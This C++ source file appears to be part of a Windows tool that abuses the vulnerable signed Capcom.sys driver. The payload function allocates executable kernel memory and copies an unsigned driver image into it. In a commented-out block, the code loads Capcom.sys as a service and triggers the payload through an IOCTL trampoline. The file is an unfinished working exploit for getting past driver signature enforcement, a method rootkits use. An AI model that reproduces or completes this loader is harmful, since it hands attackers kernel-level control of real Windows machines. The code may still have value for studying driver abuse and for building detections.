// CapcomLib.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "DriverLoader.h"
#include "PELoader.h"
#include "PEFile.h"
#include "KernelHelp.h"

DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");

PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
{
	__debugbreak();

	// Allocate executable unpaged memory for driver
	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, DriverLoader::TargetDriverPE.size(), '\0kdD');
	if (drvmap)
	{
		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
		__movsq((PDWORD64)drvmap, (PDWORD64)DriverLoader::TargetDriverPE.c_str(), (SIZE_T)DriverLoader::TargetDriverPE.size() / sizeof(INT64));
	}
	return nullptr;
} 

int main()
{
	PEImage loader(L"Capcom.sys");
	HMODULE base = loader.MapFlat();
	printf("Mapped Capcom.sys to: %p", base);
	/*DriverLoader loader;
	loader.LoadDriverFromFile(L".\\Capcom.sys");
	loader.LoadCapcomService();
	loader.ExecIoCtlWithTrampoline(LoaderPayload);
	*/
	getchar();
    return 0;
}

 